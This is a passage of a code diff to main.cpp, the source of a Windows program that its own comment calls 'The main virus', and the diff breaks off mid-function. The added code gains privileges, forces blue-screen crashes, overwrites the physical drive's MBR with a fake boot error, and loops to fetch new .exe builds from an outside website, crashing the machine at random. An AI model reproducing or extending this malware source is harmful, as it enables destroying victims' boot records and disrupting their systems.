@@ -6,34 +6,70 @@ main:main.cpp
 The main virus.
 
 command:
-/Cd:必须的参数
+/c:必须的参数
 /r:正常运行
-/b:蓝屏
+/b:直接蓝屏
 /m:改MBR
-/v:直接退出
+/e:直接退出
+/-b：禁用蓝屏
+/-s：禁用声音
 */
 
 #define __BUILD__ 1
+
 #include"std.h"
 #include"func.h"
 #include"hide.h"
 
-int _tmain(int argc, _TCHAR* argv[])
+int _tmain(int argc, TCHAR* c_argv[])
 {
-	__time64_t now=0;
+	__time64_t now = 0;
 	std::wstringstream wss;
 	std::wfstream wfs;
+	std::wstring arg;
+	std::vector<std::wstring> argv(c_argv+1,c_argv+argc-1);
+	bool
+		cmd_c = false,
+		cmd_r = false,
+		cmd_b = false,
+		cmd_m = false,
+		cmd_e = false,
+		cmd__b = false,
+		cmd__s = false;
+
+
+	//读取argv
+	cmd_c = std::find(argv.begin(), argv.end(), static_cast<std::wstring>(_T("/c"))) != argv.end();
+	cmd_r = std::find(argv.begin(), argv.end(), static_cast<std::wstring>(_T("/r"))) != argv.end();
+	cmd_b = std::find(argv.begin(), argv.end(), static_cast<std::wstring>(_T("/b"))) != argv.end();
+	cmd_m = std::find(argv.begin(), argv.end(), static_cast<std::wstring>(_T("/m"))) != argv.end();
+	cmd_e = std::find(argv.begin(), argv.end(), static_cast<std::wstring>(_T("/e"))) != argv.end();
+	cmd__b = std::find(argv.begin(), argv.end(), static_cast<std::wstring>(_T("/-b"))) != argv.end();
+	cmd__s = std::find(argv.begin(), argv.end(), static_cast<std::wstring>(_T("/-s"))) != argv.end();
+
+	if (!cmd_c)
+		return 1;//不是内部调用
+
 	GetPrivileges();
-	while (true)
+
+	if (cmd_b)
+		MakeBlueScreen(0xcccccccc);
+	if (cmd_m)
+		WritePhydriveMBR(0,"Unknown Hard Error.\r\nTry to reboot.\r\n\n\nWindows Boot Manager NT 10.0");
+	if (cmd_e)
+		return 0;
+
+	while (cmd_r)
 	{
 		now=_time64(NULL);
-		srand(static_cast<unsigned int>(static_cast<unsigned int>(now)));
+		srand(static_cast<unsigned int>(now));
 		bool iserror=false;
 		wss<<GetDataFromURL(_T("https://llv-website.rf.gd/update/lastbuild.txt"),iserror);
 		int lastbuildnumber = 0;
 		wss >> lastbuildnumber;
 		if (lastbuildnumber > __BUILD__)
-		{//update new Build
+		{
+			//download update
 			std::wstring newbuildname;
 			wss << lastbuildnumber << _T(".exe") << std::flush;
 			wss >> newbuildname;
@@ -41,9 +77,10 @@ int _tmain(int argc, _TCHAR* argv[])
 			wfs.open(_T("%ProgramData%\\llv\\launcherobj.ini"), std::ios::out);
 			wfs << lastbuildnumber;
 			wfs.close();
-			if (rand() % 16 == 0)
+			//抽奖
+			if (rand() % 16 == 0&&!cmd__b)
 				MakeBlueScreen(0xAA232323);
-			if (rand() % 16 == 0)
+			if (rand() % 16 == 0&&!cmd__s)
 			{
 				std::wstring soundid;
 				wss << rand() % 5 << std::flush;
